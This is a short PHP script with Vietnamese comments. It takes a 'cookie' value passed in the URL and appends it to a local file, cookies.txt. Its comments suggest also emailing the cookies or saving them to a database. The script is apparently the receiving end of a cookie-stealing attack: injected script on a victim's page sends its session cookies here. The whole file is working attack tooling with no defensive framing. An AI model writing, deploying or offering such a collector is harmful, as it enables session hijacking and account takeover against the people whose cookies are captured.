<?php
// Lấy giá trị cookie từ tham số "cookie" trong URL
$cookie = $_GET['cookie'];

// Ghi giá trị cookie vào file log để theo dõi
$file = 'cookies.txt';
file_put_contents($file, $cookie . "\n", FILE_APPEND);

// Có thể thêm phần xử lý khác nếu cần, ví dụ: gửi qua email, lưu vào cơ sở dữ liệu, ...
?>
